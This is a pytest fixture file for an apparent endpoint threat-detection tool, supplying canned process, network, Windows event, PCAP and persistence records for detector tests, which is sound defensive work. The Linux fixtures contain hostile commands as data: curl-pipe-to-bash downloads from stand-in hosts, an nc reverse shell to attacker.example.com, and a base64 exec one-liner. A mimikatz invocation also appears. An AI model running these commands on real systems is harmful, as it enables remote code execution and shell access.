import os
from collections.abc import Iterator

import pytest

from sentinelclaw.detectors.log_detector import analyze_windows_events
from sentinelclaw.detectors.network_detector import analyze_network
from sentinelclaw.detectors.pcap_detector import analyze_pcap_findings
from sentinelclaw.detectors.process_detector import analyze_processes
from sentinelclaw.engine.correlation_engine import correlate_findings
from sentinelclaw.engine.finding_processor import process_findings

ENV_PREFIX = "SENTINELCLAW_"


@pytest.fixture
def sample_processes() -> list[dict]:
    """Deterministic process records in the exact shape produced by
    ``sentinelclaw.tools.process_analyzer.get_processes``
    (keys: pid, ppid, name, parent_name, username, executable,
    exe_deleted, status, memory_percent, command_line, create_time) and
    consumed by ``sentinelclaw.detectors.process_detector.analyze_processes``.
    """
    return [
        {
            "pid": 500,
            "ppid": 4,
            "name": "svchost.exe",
            "parent_name": "services.exe",
            "username": "NT AUTHORITY\\SYSTEM",
            "executable": (r"C:\Windows\System32\svchost.exe"),
            "status": "running",
            "memory_percent": 0.4,
            "command_line": [
                "C:\\Windows\\System32\\svchost.exe",
                "-k",
                "netsvcs",
            ],
            "create_time": "2026-09-08T09:00:00+00:00",
        },
        {
            "pid": 1337,
            "ppid": 500,
            "name": "mimikatz.exe",
            "parent_name": "cmd.exe",
            "username": "TEST\\analyst",
            "executable": (r"C:\Users\analyst\Downloads\mimikatz.exe"),
            "status": "running",
            "memory_percent": 1.2,
            "command_line": [
                "mimikatz.exe",
                "privilege::debug",
            ],
            "create_time": "2026-09-08T09:01:00+00:00",
        },
        {
            "pid": 4242,
            "ppid": 1000,
            "name": "powershell.exe",
            "parent_name": "cmd.exe",
            "username": "TEST\\analyst",
            "executable": (
                r"C:\Windows\System32\WindowsPowerShell"
                r"\v1.0\powershell.exe"
            ),
            "status": "running",
            "memory_percent": 0.1,
            "command_line": [
                "powershell.exe",
                "-EncodedCommand",
                "VABFAFMAVA==",
            ],
            "create_time": "2026-09-08T09:02:00+00:00",
        },
        {
            "pid": 9001,
            "ppid": 4242,
            "name": "powershell.exe",
            "parent_name": "winword.exe",
            "username": "TEST\\analyst",
            "executable": (
                r"C:\Windows\System32\WindowsPowerShell"
                r"\v1.0\powershell.exe"
            ),
            "status": "running",
            "memory_percent": 0.2,
            "command_line": [
                "powershell.exe",
                "-NoProfile",
                "-WindowStyle",
                "Hidden",
            ],
            "create_time": "2026-09-08T09:03:00+00:00",
        },
    ]


@pytest.fixture

def sample_linux_processes() -> list[dict]:
    """Deterministic Linux-style process records (P1-10), including
    download-and-execute, reverse-shell, encoded-interpreter, writable-path
    and deleted-binary indicators. Consumed by
    ``sentinelclaw.detectors.process_detector.analyze_processes``.
    """
    return [
        {
            "pid": 31337,
            "ppid": 1000,
            "name": "bash",
            "parent_name": "curl",
            "username": "analyst",
            "executable": "/usr/bin/bash",
            "exe_deleted": False,
            "status": "running",
            "memory_percent": 0.5,
            "command_line": [
                "bash",
                "-c",
                "curl http://x/y.sh | bash",
            ],
            "create_time": "2026-09-08T10:00:00+00:00",
        },
        {
            "pid": 31338,
            "ppid": 31337,
            "name": "nc",
            "parent_name": "bash",
            "username": "analyst",
            "executable": "/usr/bin/nc",
            "exe_deleted": False,
            "status": "running",
            "memory_percent": 0.2,
            "command_line": [
                "nc",
                "-e",
                "/bin/sh",
                "attacker.example.com",
                "4444",
            ],
            "create_time": "2026-09-08T10:00:05+00:00",
        },
        {
            "pid": 31339,
            "ppid": 1,
            "name": "python3",
            "parent_name": "systemd",
            "username": "analyst",
            "executable": "/usr/bin/python3",
            "exe_deleted": False,
            "status": "running",
            "memory_percent": 0.3,
            "command_line": [
                "python3",
                "-c",
                "import base64; exec(base64.b64decode('cGF5bG9hZA=='))",
            ],
            "create_time": "2026-09-08T10:00:10+00:00",
        },
        {
            "pid": 31340,
            "ppid": 1,
            "name": "bash",
            "parent_name": "init",
            "username": "analyst",
            "executable": "/tmp/evil.sh",
            "exe_deleted": True,
            "status": "running",
            "memory_percent": 0.1,
            "command_line": [
                "/tmp/evil.sh",
            ],
            "create_time": "2026-09-08T10:00:15+00:00",
        },
    ]


@pytest.fixture

def sample_persistence_records() -> list[dict]:
    """Deterministic Linux persistence records (P1-10) covering cron,
    systemd, rc scripts and at jobs. Consumed by
    ``sentinelclaw.detectors.persistence_detector.analyze_persistence_records``.
    """
    return [
        {
            "mechanism": "cron",
            "path": "/etc/cron.d/backup",
            "user": "root",
            "line": 3,
            "command": "* * * * * curl http://evil.example/x.sh | bash",
            "content": "* * * * * root curl http://evil.example/x.sh | bash",
            "world_writable": False,
        },
        {
            "mechanism": "cron",
            "path": "/var/spool/cron/analyst",
            "user": "analyst",
            "line": 1,
            "command": "*/5 * * * * /tmp/updater.sh",
            "content": "*/5 * * * * /tmp/updater.sh",
            "world_writable": False,
        },
        {
            "mechanism": "systemd_unit",
            "path": "/etc/systemd/system/evil.service",
            "exec_start": "/usr/bin/python3 /tmp/evil.py",
            "world_writable": False,
            "writable_by_others": True,
        },
        {
            "mechanism": "systemd_unit",
            "path": "/usr/lib/systemd/system/legit.service",
            "exec_start": "/bin/false",
            "world_writable": False,
            "writable_by_others": False,
        },
        {
            "mechanism": "rc_script",
            "path": "/etc/rc3.d/S99evil",
            "target": "../init.d/evil",
            "world_writable": True,
        },
        {
            "mechanism": "at_job",
            "path": "/var/spool/at/a0001",
            "command": "/tmp/payload.sh",
            "world_writable": False,
        },
    ]


@pytest.fixture
def process_list(sample_processes: list[dict]) -> list[dict]:
    """Alias of ``sample_processes`` for tests naming the data by role."""
    return sample_processes


@pytest.fixture
def sample_connections() -> list[dict]:
    """Deterministic network connection records in the exact shape produced
    by ``sentinelclaw.tools.network_analyzer.get_network_connections``
    (keys: local_address, remote_address, status, pid, family, type)
    and consumed by ``sentinelclaw.detectors.network_detector.analyze_network``.
    """
    return [
        {
            "local_address": {
                "ip": "192.168.1.10",
                "port": 49152,
            },
            "remote_address": {
                "ip": "8.8.8.8",
                "port": 4444,
            },
            "status": "ESTABLISHED",
            "pid": 4242,
            "family": "AddressFamily.AF_INET",
            "type": "SocketKind.SOCK_STREAM",
        },
        {
            "local_address": {
                "ip": "192.168.1.10",
                "port": 49153,
            },
            "remote_address": {
                "ip": "10.0.0.5",
                "port": 443,
            },
            "status": "ESTABLISHED",
            "pid": 500,
            "family": "AddressFamily.AF_INET",
            "type": "SocketKind.SOCK_STREAM",
        },
        {
            "local_address": {
                "ip": "127.0.0.1",
                "port": 5353,
            },
            "remote_address": None,
            "status": "LISTEN",
            "pid": 1234,
            "family": "AddressFamily.AF_INET",
            "type": "SocketKind.SOCK_DGRAM",
        },
        {
            "error": (
                "Access denied while reading network connections. "
                "Try running the terminal as Administrator."
            )
        },
    ]


@pytest.fixture
def connection_list(
    sample_connections: list[dict],
) -> list[dict]:
    """Alias of ``sample_connections`` for tests naming the data by role."""
    return sample_connections


@pytest.fixture
def sample_windows_events() -> list[dict]:
    """Deterministic Windows Security event records in the exact shape
    produced by ``sentinelclaw.tools.windows_event_analyzer.get_windows_events``
    (keys: event_id, event_name, source, computer, timestamp, event_type,
    record_number, message_data) and consumed by
    ``sentinelclaw.detectors.log_detector.analyze_windows_events``.
    """
    return [
        {
            "event_id": 4625,
            "event_name": "Failed logon",
            "source": "Microsoft-Windows-Security-Auditing",
            "computer": "HOST-01",
            "timestamp": "2026-09-08T09:10:00+00:00",
            "event_type": 0,
            "record_number": 1101,
            "message_data": ("LogonType 3 | S-1-5-18 | WORKSTATION\\analyst"),
        },
        {
            "event_id": 4625,
            "event_name": "Failed logon",
            "source": "Microsoft-Windows-Security-Auditing",
            "computer": "HOST-01",
            "timestamp": "2026-09-08T09:10:05+00:00",
            "event_type": 0,
            "record_number": 1102,
            "message_data": ("LogonType 3 | S-1-5-18 | WORKSTATION\\analyst"),
        },
        {
            "event_id": 4625,
            "event_name": "Failed logon",
            "source": "Microsoft-Windows-Security-Auditing",
            "computer": "HOST-01",
            "timestamp": "2026-09-08T09:10:10+00:00",
            "event_type": 0,
            "record_number": 1103,
            "message_data": ("LogonType 3 | S-1-5-18 | WORKSTATION\\analyst"),
        },
        {
            "event_id": 1102,
            "event_name": "Audit log cleared",
            "source": "Microsoft-Windows-Security-Auditing",
            "computer": "HOST-01",
            "timestamp": "2026-09-08T09:11:00+00:00",
            "event_type": 0,
            "record_number": 1104,
            "message_data": "analyst",
        },
        {
            "event_id": 4720,
            "event_name": "User account created",
            "source": "Microsoft-Windows-Security-Auditing",
            "computer": "HOST-01",
            "timestamp": "2026-09-08T09:12:00+00:00",
            "event_type": 0,
            "record_number": 1105,
            "message_data": ("backup_usr | WORKSTATION | S-1-5-21-1001"),
        },
    ]


@pytest.fixture
def sample_pcap_flows() -> list[dict]:
    """Deterministic normalized flow records matching the ``flows`` list
    produced by ``sentinelclaw.tools.pcap_analyzer.analyze_pcap``
    (keys: source_ip, source_port, destination_ip, destination_port,
    protocol, packet_count).
    """
    return [
        {
            "source_ip": "192.168.1.10",
            "source_port": 49152,
            "destination_ip": "203.0.113.9",
            "destination_port": 4444,
            "protocol": "TCP",
            "packet_count": 5,
        },
        {
            "source_ip": "192.168.1.10",
            "source_port": 49153,
            "destination_ip": "203.0.113.9",
            "destination_port": 443,
            "protocol": "TCP",
            "packet_count": 12,
        },
        {
            "source_ip": "192.168.1.10",
            "source_port": 12345,
            "destination_ip": "203.0.113.77",
            "destination_port": 53,
            "protocol": "UDP",
            "packet_count": 6000,
        },
    ]


@pytest.fixture
def sample_pcap_data(
    sample_pcap_flows: list[dict],
) -> dict:
    """Deterministic normalized PCAP analysis dict in the shape returned by
    ``sentinelclaw.tools.pcap_analyzer.analyze_pcap`` and consumed by
    ``sentinelclaw.detectors.pcap_detector.analyze_pcap_findings``.
    Scan candidates use the analyzer's keys (source_ip, destination_ip,
    unique_destination_ports, destination_ports).
    """
    return {
        "path": "/tmp/canned-capture.pcap",
        "name": "canned-capture.pcap",
        "size_bytes": 4096,
        "packets_total": 6017,
        "protocols": {
            "tcp": 17,
            "udp": 6000,
            "other": 0,
        },
        "protocol_counts": {
            "TCP": 17,
            "UDP": 6000,
        },
        "unique_ips": 3,
        "unique_flows": 3,
        "top_source_ips": [
            {
                "ip": "192.168.1.10",
                "packets": 6017,
            }
        ],
        "top_destination_ips": [
            {
                "ip": "203.0.113.9",
                "packets": 17,
            },
            {
                "ip": "203.0.113.77",
                "packets": 6000,
            },
        ],
        "top_destination_ports": [
            {
                "port": 53,
                "packets": 6000,
            },
            {
                "port": 4444,
                "packets": 5,
            },
            {
                "port": 443,
                "packets": 12,
            },
        ],
        "flows": sample_pcap_flows,
        "tcp_scan_candidates": [
            {
                "source_ip": "192.168.1.10",
                "destination_ip": "203.0.113.9",
                "unique_destination_ports": 25,
                "destination_ports": [
                    22,
                    23,
                    25,
                    80,
                    443,
                    3389,
                    4444,
                    5555,
                    6667,
                    8080,
                    8443,
                ],
            }
        ],
        "udp_scan_candidates": [],
        "packet_samples": [],
    }


@pytest.fixture(autouse=True)
def env_isolation() -> Iterator[None]:
    """Snapshot and restore all ``SENTINELCLAW_*`` environment variables
    around each test.

    ``sentinelclaw.config.settings.get_settings`` caches on an environment
    signature (``_env_signature``), so restoring the environment to its
    pre-test state guarantees the next ``get_settings()`` call reloads
    rather than serving a cache entry mutated by the test.
    """
    saved = {key: value for key, value in os.environ.items() if key.startswith(ENV_PREFIX)}

    yield

    for key in list(os.environ):
        if key.startswith(ENV_PREFIX):
            del os.environ[key]

    os.environ.update(saved)


@pytest.fixture
def rules_dir_tmp(
    tmp_path,
) -> object:
    """A temporary rules directory containing one minimal process rule and
    one minimal network rule, matching the YAML schema loaded by
    ``sentinelclaw.engine.rule_engine.load_rule_file`` (a top-level ``rules``
    list with id/title/description/category/severity/confidence/match/mitre/
    conditions entries, as shipped in ``rules/process_rules.yaml``).
    """
    rule_directory = tmp_path / "rules"
    rule_directory.mkdir()

    (rule_directory / "process_rules.yaml").write_text(
        "rules:\n"
        "  - id: PROC-FIX-001\n"
        "    title: Fixture encoded PowerShell\n"
        "    description: Synthetic rule for fixture tests.\n"
        "    category: process\n"
        "    severity: high\n"
        "    confidence: high\n"
        "    enabled: true\n"
        "    match: all\n"
        "    mitre:\n"
        "      tactic: Execution\n"
        "      technique: T1059.001\n"
        "      name: PowerShell\n"
        "    conditions:\n"
        "      - field: name\n"
        "        operator: equals\n"
        "        value:\n"
        "          - powershell.exe\n"
        "          - pwsh.exe\n"
        "      - field: command_line\n"
        "        operator: contains\n"
        "        value:\n"
        '          - "-encodedcommand"\n'
        '          - "-enc"\n',
        encoding="utf-8",
    )

    (rule_directory / "network_rules.yaml").write_text(
        "rules:\n"
        "  - id: NET-FIX-001\n"
        "    title: Fixture monitored remote port\n"
        "    description: Synthetic rule for fixture tests.\n"
        "    category: network\n"
        "    severity: medium\n"
        "    confidence: medium\n"
        "    enabled: true\n"
        "    match: all\n"
        "    conditions:\n"
        "      - field: remote_address.port\n"
        "        operator: equals\n"
        "        value: 4444\n",
        encoding="utf-8",
    )

    return rule_directory


@pytest.fixture
def detector_pipeline() -> object:
    """Bundle of canned-data analysis entry points used by the Phase 1
    fixture-consuming tests; keeps imports out of individual test modules.
    """
    return {
        "analyze_processes": analyze_processes,
        "analyze_network": analyze_network,
        "analyze_windows_events": analyze_windows_events,
        "analyze_pcap_findings": analyze_pcap_findings,
        "correlate_findings": correlate_findings,
        "process_findings": process_findings,
    }
